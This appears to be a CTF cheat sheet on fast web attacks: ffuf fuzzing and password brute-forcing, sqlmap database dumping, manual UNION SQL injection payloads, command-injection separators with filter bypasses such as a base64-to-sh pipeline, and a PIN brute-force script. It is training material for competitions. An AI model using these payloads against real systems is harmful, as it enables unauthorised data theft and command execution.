# High-Speed Web Tools (Bypassing Burp Community Limits)

In CTF competitions, Burp Suite Community Intruder is too slow due to deliberate throttling. Use the following tools and workflows for speed.

---

## 1. FFUF with Raw Burp Requests

`ffuf` replaces Burp Intruder and processes thousands of requests per second.

### Workflow:
1. In Burp Suite, right click target HTTP request > Copy to file (or copy text) > Save as `req.txt`.
2. Edit `req.txt` and place the word `FUZZ` where you want to inject payloads.
3. Run `ffuf`:

```bash
# Basic parameter or password brute-force
ffuf -request req.txt -request-proto http -w wordlist.txt -mc 200,302

# Fuzzing with size filter (ignores default error pages)
ffuf -request req.txt -request-proto http -w wordlist.txt -fs <ERROR_PAGE_SIZE>

# Fuzzing matching a specific string in response
ffuf -request req.txt -request-proto http -w wordlist.txt -mr "flag{"
```

---

## 2. SQLMap with Raw Burp Requests

Automates SQL injection extraction in seconds:

```bash
# Step 1: Detect injection point and list databases
sqlmap -r req.txt --batch --dbs

# Step 2: List tables in database
sqlmap -r req.txt -D <DB_NAME> --tables --batch

# Step 3: Dump flag table contents
sqlmap -r req.txt -D <DB_NAME> -T <TABLE_NAME> --dump --batch

# Deeper scan (headers, cookies, aggressive payloads)
sqlmap -r req.txt --level=3 --risk=3 --batch --dbs
```

---

## 3. Fast Manual SQL Injection (Repeater)

When automated tools are blocked by WAF:

### Find Column Count in 5 Seconds:
Inject into parameter:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Increase the number until the application returns an error (e.g. error at `ORDER BY 4` means there are 3 columns).

### Extract Data with UNION:
```sql
' UNION SELECT null, null, null--
' UNION SELECT 1, version(), 3--
' UNION SELECT 1, table_name, 3 FROM information_schema.tables--
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='flags'--
' UNION SELECT 1, flag, 3 FROM flags--
```

---

## 4. Fast Command Injection (Repeater)

Test input parameters with command separators:

```text
; id
| id
& id
`id`
$(id)
%0a id
```

### Bypass Filters:
- Space blocked: `cat$IFS/flag*` or `cat${IFS}/flag.txt` or `cat</flag.txt`
- Slashes blocked: `cd .. && cd .. && cat flag.txt`
- Base64 pipeline: `echo Y2F0IC9mbGFn* | base64 -d | sh`

---

## 5. Python Rapid Session Script

Use when you need custom automated requests:

```python
#!/usr/bin/env python3
import requests

url = "http://target.ctf.com/login"
s = requests.Session()

# Example: Brute-forcing a 4-digit PIN
for pin in range(1000, 10000):
    r = s.post(url, data={"pin": str(pin)})
    if "Invalid" not in r.text:
        print(f"[+] Correct PIN: {pin}")
        print(r.text)
        break
```
